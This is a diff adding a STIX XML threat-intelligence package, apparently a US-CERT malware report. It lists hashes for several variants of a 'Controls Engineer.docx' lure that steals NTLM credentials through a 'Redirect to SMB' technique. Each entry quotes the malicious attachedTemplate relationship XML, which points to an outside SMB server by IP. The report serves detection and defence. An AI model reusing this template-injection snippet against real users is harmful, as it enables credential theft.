@@ -1,0 +1,1785 @@
+<stix:STIX_Package 
+	xmlns:cyboxCommon="http://cybox.mitre.org/common-2"
+	xmlns:cybox="http://cybox.mitre.org/cybox-2"
+	xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2"
+	xmlns:AddressObj="http://cybox.mitre.org/objects#AddressObject-2"
+	xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2"
+	xmlns:PortObj="http://cybox.mitre.org/objects#PortObject-2"
+	xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2"
+	xmlns:WhoisObj="http://cybox.mitre.org/objects#WhoisObject-2"
+	xmlns:marking="http://data-marking.mitre.org/Marking-1"
+	xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1"
+	xmlns:TOUMarking="http://data-marking.mitre.org/extensions/MarkingStructure#Terms_Of_Use-1"
+	xmlns:maecBundle="http://maec.mitre.org/XMLSchema/maec-bundle-4"
+	xmlns:maecPackage="http://maec.mitre.org/XMLSchema/maec-package-2"
+	xmlns:maecVocabs="http://maec.mitre.org/default_vocabularies-1"
+	xmlns:incident="http://stix.mitre.org/Incident-1"
+	xmlns:indicator="http://stix.mitre.org/Indicator-2"
+	xmlns:ttp="http://stix.mitre.org/TTP-1"
+	xmlns:stixCommon="http://stix.mitre.org/common-1"
+	xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1"
+	xmlns:stix-maec="http://stix.mitre.org/extensions/Malware#MAEC4.1-1"
+	xmlns:stix="http://stix.mitre.org/stix-1"
+	xmlns:NCCIC="http://www.us-cert.gov/"
+	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+	xsi:schemaLocation="
+	http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd
+	http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd
+	http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd
+	http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd
+	http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd
+	http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd
+	http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd
+	http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd
+	http://cybox.mitre.org/objects#WhoisObject-2 http://cybox.mitre.org/XMLSchema/objects/Whois/2.1/Whois_Object.xsd
+	http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd
+	http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd
+	http://data-marking.mitre.org/extensions/MarkingStructure#Terms_Of_Use-1 http://stix.mitre.org/XMLSchema/extensions/marking/terms_of_use/1.0.1/terms_of_use_marking.xsd
+	http://maec.mitre.org/XMLSchema/maec-bundle-4 http://maec.mitre.org/language/version4.1/maec_bundle_schema.xsd
+	http://maec.mitre.org/XMLSchema/maec-package-2 http://maec.mitre.org/language/version4.1/maec_package_schema.xsd
+	http://maec.mitre.org/default_vocabularies-1 http://maec.mitre.org/language/version4.1/maec_default_vocabularies.xsd
+	http://stix.mitre.org/Incident-1 http://stix.mitre.org/XMLSchema/incident/1.1.1/incident.xsd
+	http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd
+	http://stix.mitre.org/TTP-1 http://stix.mitre.org/XMLSchema/ttp/1.1.1/ttp.xsd
+	http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd
+	http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd
+	http://stix.mitre.org/extensions/Malware#MAEC4.1-1 http://stix.mitre.org/XMLSchema/extensions/malware/maec_4.1/1.0.1/maec_4.1_malware.xsd
+	http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd" id="NCCIC:Package-314bdd3f-c152-4791-ab92-d4fae48068ae" version="1.1.1" timestamp="2017-10-13T16:17:31.057590+00:00">
+    <stix:STIX_Header>
+        <stix:Title>MIFR-10128327</stix:Title>
+        <stix:Package_Intent>Malware Characterization</stix:Package_Intent>
+        <stix:Handling>
+            <marking:Marking>
+                <marking:Controlled_Structure>//node() | //@*</marking:Controlled_Structure>
+                <marking:Marking_Structure xsi:type='tlpMarking:TLPMarkingStructureType' color="WHITE"/>
+                <marking:Marking_Structure xsi:type='TOUMarking:TermsOfUseMarkingStructureType'>
+                    <TOUMarking:Terms_Of_Use>This report is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp.</TOUMarking:Terms_Of_Use>
+                </marking:Marking_Structure>
+            </marking:Marking>
+        </stix:Handling>
+        <stix:Information_Source>
+            <stixCommon:Identity>
+                <stixCommon:Name>US-CERT</stixCommon:Name>
+            </stixCommon:Identity>
+            <stixCommon:Time>
+                <cyboxCommon:Produced_Time>2017-10-13T14:20:44.803567+00:00</cyboxCommon:Produced_Time>
+            </stixCommon:Time>
+            <stixCommon:Tools>
+                <cyboxCommon:Tool>
+                    <cyboxCommon:Name>bmachine</cyboxCommon:Name>
+                    <cyboxCommon:Description>F694.F694.F694.G8WM.F694.F694.F694.F694.F694.F694.F694.F694.F694</cyboxCommon:Description>
+                    <cyboxCommon:Version>6.4.17</cyboxCommon:Version>
+                </cyboxCommon:Tool>
+            </stixCommon:Tools>
+        </stix:Information_Source>
+    </stix:STIX_Header>
+    <stix:Observables cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+        <cybox:Observable id="NCCIC:Observable-e489c376-5145-41e4-8eb2-bb861b724a70">
+            <cybox:Description><![CDATA[This Word Document uses "Redirect to SMB" attack to steal victim credentials. 
+
+This Word Document contains an embedded file URL, "file[:]//62.8.193.206/Normal.dotm", within its relationship component "word/_rels/settings.xml.rels." When the Word Document is opened, this file URL causes Windows to automatically attempt to authenticate to the malicious SMB server at 62.8.193.206 by providing the victim's encrypted user credentials (NTLM v2 Hash) without prompting the user or without the user's knowledge. The operator may then capture the NTLM hash and attempt to crack the password used to create it via a brute force dictionary attack. If the operator is successful, they will now possess the victim's username and password and may be able to access the victim's system remotely. 
+
+The malicious SMB server has the following IP:
+
+-- Begin IP --
+62.8.193.206
+-- End IP -- 
+
+-- Begin Content "word/_rels/settings.xml.rels" --
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+                <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+                        <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+                        Target="file[:]//62.8.193.206/Normal.dotm"
+                        TargetMode="External"/>
+                </Relationships>
+-- End Content "word/_rels/settings.xml.rels" --]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-b17cdc5e-e890-45ee-9817-4d1edcfb3829">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>Controls Engineer.docx</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>19270</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>Zip archive data, at least v2.0 to extract</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>a6d36749eebbbc51b552e5803ed1fd58</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>3ceb153fcd9407c92b3c71eb0acf74e681691b98</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>83bf581c874436e726c2ca92446375f18ad1f9b703c56097f274bfe11e1c1cae</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>78ef8f8e4845d8271c072a322ec6c4ef09d4b1167821ae90a991f7f07542982f9fcb9b3310117353d818b9913fadadb78b5da9a1eede3779f0322d711d5b7add</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>384:F1sPE46JbzcB1mjvxqIJwpsxQVjI+GHoJSkhvnewMrKrNfXFg:78EVETmjUsqJDndMuBfXq</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>7.82005155684</FileObj:Peak_Entropy>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:Address-aaf2ca99-8d03-424a-99c1-3fc0c28039c5">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-13023dbd-8df9-4724-9dc5-da6ac0b886ce">
+            <cybox:Description><![CDATA[This Word Document uses "Redirect to SMB" attack to steal victim credentials. 
+
+This Word Document contains an embedded file URL, "file[:]//62.8.193.206/Normal.dotm", within its relationship component "word/_rels/settings.xml.rels." When the Word Document is opened, this file URL causes Windows to automatically attempt to authenticate to the malicious SMB server at 62.8.193.206 by providing the victim's encrypted user credentials (NTLM v2 Hash) without prompting the user or without the user's knowledge. The operator may then capture the NTLM hash and attempt to crack the password used to create it via a brute force dictionary attack. If the operator is successful, they will now possess the victim's username and password and may be able to access the victim's system remotely. 
+
+The malicious SMB server has the following IP:
+
+-- Begin IP --
+62.8.193.206
+-- End IP -- 
+
+-- Begin Content "word/_rels/settings.xml.rels" --
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+                <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+                        <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+                        Target="file[:]//62.8.193.206/Normal.dotm"
+                        TargetMode="External"/>
+                </Relationships>
+-- End Content "word/_rels/settings.xml.rels" --]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-c84bf4e5-9672-4383-9662-60590c03b1e2">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>Controls Engineer.docx</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>19605</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>Zip archive data, at least v2.0 to extract</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>038a97b4e2f37f34b255f0643e49fc9d</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>f8301523fe802402441f207c0f7c61b8aa3cfa63</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>b921377d78f4278a88862bb712f5f4e6573a3a19de7754241d36ef903a06a361</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>8219daac129decb2f3218de3dd13f4551437090d5be52713542d03291e279575dcce4657445eef3e4d4fee927c8d9d268bff1730c1091bc0dda30a61f75973b8</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>384:F2sPE46JbzcB1mjvxqIJwpsxQVzI+GHoJDUhvWew8rKrNf28v:o8EVETmjUsqZuWd8uBfn</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>7.78916156016</FileObj:Peak_Entropy>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:Address-aaf2ca99-8d03-424a-99c1-3fc0c28039c5">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-14f594c8-4e57-4c43-bf6d-eee1b77d31d6">
+            <cybox:Description><![CDATA[This Word Document uses "Redirect to SMB" attack to steal victim credentials. 
+
+This Word Document contains an embedded file URL, "file[:]//62.8.193.206/Normal.dotm", within its relationship component "word/_rels/settings.xml.rels." When the Word Document is opened, this file URL causes Windows to automatically attempt to authenticate to the malicious SMB server at 62.8.193.206 by providing the victim's encrypted user credentials (NTLM v2 Hash) without prompting the user or without the user's knowledge. The operator may then capture the NTLM hash and attempt to crack the password used to create it via a brute force dictionary attack. If the operator is successful, they will now possess the victim's username and password and may be able to access the victim's system remotely. 
+
+The malicious SMB server has the following IP:
+
+-- Begin IP --
+62.8.193.206
+-- End IP -- 
+
+-- Begin Content "word/_rels/settings.xml.rels" --
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+                <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+                        <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+                        Target="file[:]//62.8.193.206/Normal.dotm"
+                        TargetMode="External"/>
+                </Relationships>
+-- End Content "word/_rels/settings.xml.rels" --]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-2d7757a2-24db-4391-855e-101a4167fac5">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>Controls Engineer.docx</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>19298</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>Zip archive data, at least v2.0 to extract</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>65a1a73253f04354886f375b59550b46</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>5f1d8a38ec40c2e86d54bfb7d9ce6571e8f944c6</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>07dce3779984f6b92e70acf0f506a0351c461058cf966e52e218811bfeb40345</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>3f209a0576910437bfefc29289a34176d61fdb6208243ff4fa224f57d9c834fd88d9541b024bba7b666a60731e73fa38a40bf8aa9c9183c956ce78a869f21aa0</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>384:F1sPE46JbzcB1mjvxqIJwpsxQVjI+GHoJSkhvnew74rKrNfXqJ:78EVETmjUsqJDndMuBfXe</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>7.81659183222</FileObj:Peak_Entropy>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:Address-aaf2ca99-8d03-424a-99c1-3fc0c28039c5">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-85f144f3-f9d3-4ae6-a8e0-d4a7fd3b22bf">
+            <cybox:Description><![CDATA[This Word Document uses "Redirect to SMB" attack to steal victim credentials. 
+
+This Word Document contains an embedded file URL, "file[:]//62.8.193.206/Normal.dotm", within its relationship component "word/_rels/settings.xml.rels." When the Word Document is opened, this file URL causes Windows to automatically attempt to authenticate to the malicious SMB server at 62.8.193.206 by providing the victim's encrypted user credentials (NTLM v2 Hash) without prompting the user or without the user's knowledge. The operator may then capture the NTLM hash and attempt to crack the password used to create it via a brute force dictionary attack. If the operator is successful, they will now possess the victim's username and password and may be able to access the victim's system remotely. 
+
+The malicious SMB server has the following IP:
+
+-- Begin IP --
+62.8.193.206
+-- End IP -- 
+
+-- Begin Content "word/_rels/settings.xml.rels" --
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+                <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+                        <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+                        Target="file[:]//62.8.193.206/Normal.dotm"
+                        TargetMode="External"/>
+                </Relationships>
+-- End Content "word/_rels/settings.xml.rels" --]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-2436151b-190c-499d-8174-2e1ec1fb0838">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>Controls Engineer.docx</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>19298</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>Zip archive data, at least v2.0 to extract</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>31008de622ca9526f5f4a1dd3f16f4ea</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>c8c8b2739fcf48c7071e41576791c1b5a9a0cb3a</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>70af355858872e2d8a3c536813094107dad3015252c97cd7ed4e0488b3b50743</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>a50c4a74043e06106e3786dd18d9a6c58e55625e24476bf2d77aac87749180a3fe98a52f0afb26916156ed71a38bbc3688244156514b81d88c00cd3708972bfd</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>384:F2sPE46JbzcB1mjvxqIJwpsxQVzI+GHoJSkhvnewMrKrNf+J:o8EVETmjUsqZDndMuBf6</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>7.81640605196</FileObj:Peak_Entropy>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:Address-aaf2ca99-8d03-424a-99c1-3fc0c28039c5">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-fbe44159-3e33-48ab-bba6-c703b997e8d2">
+            <cybox:Description><![CDATA[This Word Document uses "Redirect to SMB" attack to steal victim credentials. 
+
+This Word Document contains an embedded file URL, "file[:]//62.8.193.206/Normal.dotm", within its relationship component "word/_rels/settings.xml.rels." When the Word Document is opened, this file URL causes Windows to automatically attempt to authenticate to the malicious SMB server at 62.8.193.206 by providing the victim's encrypted user credentials (NTLM v2 Hash) without prompting the user or without the user's knowledge. The operator may then capture the NTLM hash and attempt to crack the password used to create it via a brute force dictionary attack. If the operator is successful, they will now possess the victim's username and password and may be able to access the victim's system remotely. 
+
+The malicious SMB server has the following IP:
+
+-- Begin IP --
+62.8.193.206
+-- End IP -- 
+
+-- Begin Content "word/_rels/settings.xml.rels" --
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+                <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+                        <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+                        Target="file[:]//62.8.193.206/Normal.dotm"
+                        TargetMode="External"/>
+                </Relationships>
+-- End Content "word/_rels/settings.xml.rels" --]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-faf4a44b-92b3-4ddb-a5fe-032ad28c8e4f">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>Controls Engineer.docx</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>19298</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>Zip archive data, at least v2.0 to extract</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>8341e48a6b91750d99a8295c97fd55d5</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>3ce30622afb6fac1971a8534998a1d57b1062d86</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>ef9238306a754d16e6762ad3d7e0bcaaa19042f299c23dafcd69c8511c283158</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>4f64b327c7ec5b18a9b727684574800d8f842a3c6fd456956c3ac08c4c8114f6e8c42c7597bc059c2aba2db6da2018ffec89b637f27a3b77e446ab24c7491810</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>384:F1sPE46JbzcB1mjvxqIJwpsxQVjI+GHoJSkhvWew8rKrNfP3J:78EVETmjUsqJDWd8uBfPZ</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>7.81651500038</FileObj:Peak_Entropy>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:Address-aaf2ca99-8d03-424a-99c1-3fc0c28039c5">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-c1788b88-a0fc-4a7f-a436-71921a495ce8">
+            <cybox:Description><![CDATA[This Word Document uses "Redirect to SMB" attack to steal victim credentials. 
+
+This Word Document contains an embedded file URL, "file[:]//62.8.193.206/Normal.dotm", within its relationship component "word/_rels/settings.xml.rels." When the Word Document is opened, this file URL causes Windows to automatically attempt to authenticate to the malicious SMB server at 62.8.193.206 by providing the victim's encrypted user credentials (NTLM v2 Hash) without prompting the user or without the user's knowledge. The operator may then capture the NTLM hash and attempt to crack the password used to create it via a brute force dictionary attack. If the operator is successful, they will now possess the victim's username and password and may be able to access the victim's system remotely. 
+
+The malicious SMB server has the following IP:
+
+-- Begin IP --
+62.8.193.206
+-- End IP -- 
+
+-- Begin Content "word/_rels/settings.xml.rels" --
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+                <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+                        <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+                        Target="file[:]//62.8.193.206/Normal.dotm"
+                        TargetMode="External"/>
+                </Relationships>
+-- End Content "word/_rels/settings.xml.rels" --]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-a5ca3c25-730c-4bb3-b340-019bedb085b0">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>Controls Engineer.docx</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>19326</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>Zip archive data, at least v2.0 to extract</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>99aa0d0eceefce4c0856532181b449b1</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>1737a2c1b0d091f09f3f231ebc3da5661983c240</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>1e843b49338bffa476b99438fca1b3b45460df7aa10e5c0836a2f801fff31abd</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>eeb5599494010fe59a903abb143041c55dcaf44d9620ea8d2df3b675c8af8de806442930c7786bad9caba60e6eb4a40a04e42872c1b6bc3a7c8d69f5a7c49d44</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>384:F1sPE46JbzcB1mjvxqIJwpsxQVjI+GHoJDUhvWew8rKrNfHJ:78EVETmjUsqJuWd8uBfp</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>7.81297842972</FileObj:Peak_Entropy>
